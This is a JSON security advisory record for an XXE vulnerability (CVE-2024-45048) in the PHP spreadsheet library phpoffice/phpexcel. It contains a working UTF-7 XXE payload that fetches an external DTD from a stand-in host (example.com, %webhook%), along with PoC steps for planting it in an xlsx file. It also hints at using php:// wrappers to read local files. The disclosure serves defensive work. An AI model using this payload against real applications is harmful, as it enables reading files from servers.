{
  "Severity": "HIGH",
  "UpdatedAt": "2025-03-06T18:10:42Z",
  "Package": {
    "Ecosystem": "COMPOSER",
    "Name": "phpoffice/phpexcel"
  },
  "Advisory": {
    "DatabaseId": 258164,
    "Id": "GSA_kwCzR0hTQS1naGc2LTMyZjktMmpwN84AA_B0",
    "GhsaId": "GHSA-ghg6-32f9-2jp7",
    "References": [
      {
        "Url": "https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-ghg6-32f9-2jp7"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45048"
      },
      {
        "Url": "https://github.com/PHPOffice/PhpSpreadsheet/commit/bea2d4b30f24bcc8a7712e208d1359e603b45dda"
      },
      {
        "Url": "https://github.com/advisories/GHSA-ghg6-32f9-2jp7"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-ghg6-32f9-2jp7"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-45048"
      }
    ],
    "Description": "### Summary\nBypassing the filter allows a XXE-attack. Which is turn allows attacker to obtain contents of local files, even if error reporting muted by @ symbol. (LFI-attack) \n\n### Details\nCheck ` $pattern = '/encoding=\"(.*?)\"/';` easy to bypass. Just use a single quote symbol `'`. So payload looks like this:\n```\n\u003c?xml version=\"1.0\" encoding='UTF-7' standalone=\"yes\"?\u003e\n+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM \"http://example.com/file.dtd\"\u003e %xxe;]\u003e\n```\nIf you add this header to any XML file into xlsx-formatted file, such as sharedStrings.xml file, then xxe will execute. \n\n### PoC\n1) Create simple xlsx file\n2) Rename xlsx to zip\n3) Go to the zip and open the `xl/sharedStrings.xml` file in edit mode.\n4) Replace `\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e` to \n```\n\u003c?xml version=\"1.0\" encoding='UTF-7' standalone=\"yes\"?\u003e\n+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM \"http://%webhook%/file.dtd\"\u003e %xxe;]\u003e\n```\n5) Save `sharedStrings.xml` file and rename zip back to xlsx.\n6) Use minimal php code that simply opens this xlsx file:\n```\nuse PhpOffice\\PhpSpreadsheet\\IOFactory;\nrequire __DIR__ . '/vendor/autoload.php';\n$spreadsheet = IOFactory::load(\"file.xlsx\");\n```\n7) You will receive the request to your `http://%webhook%/file.dtd`\n8) Dont't forget that you can use php-wrappers into xxe, some php:// wrapper payload allows fetch local files.\n\n### Impact\nRead local files\n![lfi](https://github.com/PHPOffice/PhpSpreadsheet/assets/95242087/1839cddb-6bb0-486d-8884-9ac485776931)",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-08-29T17:58:27Z",
    "Severity": "HIGH",
    "Summary": "XXE in PHPSpreadsheet encoding is returned",
    "UpdatedAt": "2025-03-06T18:10:42Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.8,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "\u003c= 1.8.2"
    }
  ]
}